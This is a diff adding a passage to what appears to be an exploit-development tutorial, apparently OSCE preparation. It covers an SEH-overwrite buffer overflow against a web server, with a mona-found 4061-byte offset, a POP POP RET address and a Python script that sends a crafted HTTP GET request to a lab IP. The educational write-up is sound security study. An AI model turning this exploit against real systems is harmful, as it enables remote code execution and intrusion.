@@ -154,11 +154,47 @@ Checking out the SEH Chain in Immunity shows us that we have overwritten both 4 
 
 ![](/assets/images/CTP/efsSEHchain.JPG)
 
+After using `!mona pc 5000` and placing the resulting address in our SEH entry into `!mona po`, mona tells us that our SEH overwrite occurs after 4061 bytes. 
+
 What we need now is the location of a `POP POP RET` gadget in this application so that we can place it in our current SEH 4 byte space and we can work our way 4 bytes backwards into the 4 byte space that typically holds the pointer to the next SEH. 
 
 Using the `!mona seh` command, most of the addresses we see immediately stat with `00` which is not ideal since this will require us to include a null byte in our shellcode. We could try for a partial overwrite but instead, I kept looking for a more friendly 4 byte address and eventually found one at the following location in the `seh.txt` file that mona creates. 
 
 ![](/assets/images/CTP/sehlocation.JPG)
+
+Our exploit code now looks like this. Notice that I added the `nseh` parameter (I used `\xcc` but you can use `\x90` as well) so that our math stays correct and we keep getting a consistent SEH overwrite. 
+```python
+import socket
+import os
+import sys
+
+ip = "192.168.1.201"
+port = 80
+
+nseh = "\xcc" * 4
+
+#POP POP RET 0x1001ab99
+seh = '\x99\xab\x01\x10'
+
+crash = "A" * 4061
+crash += nseh
+crash += seh
+crash += "D" * (5000 - len(crash))
+
+
+buffer="GET "
+buffer+=crash
+buffer+=" HTTP/1.1\r\n"
+
+expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+expl.connect((ip, port))
+expl.send(buffer)
+expl.close()
+```
+
+Let's set a breakpoint on our `POP POP RET` address like so: 
+
+![](/assets/images/CTP/efsbreak.JPG)
 
 
 
